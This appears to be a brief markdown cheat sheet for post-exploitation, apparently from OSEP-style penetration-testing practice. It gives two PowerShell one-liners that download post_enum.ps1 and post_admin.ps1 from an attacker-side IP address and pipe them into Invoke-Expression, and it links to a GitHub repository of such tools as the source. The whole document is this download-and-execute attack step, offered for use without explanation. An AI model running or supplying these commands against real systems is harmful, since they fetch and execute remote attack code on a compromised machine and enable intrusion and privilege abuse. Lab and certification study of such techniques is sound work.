# Name
Post Exploitation Scripts

## Usage
```
powershell -c "(new-object system.net.webclient).downloadstring('http://192.168.45.203/post_enum.ps1') | IEX"

powershell -c "(new-object system.net.webclient).downloadstring('http://192.168.45.203/post_admin.ps1') | IEX"
```

## Source
https://raw.githubusercontent.com/jayesther/OSEP_OSED_TOOLS/refs/heads/main/OSEP_enum.ps1

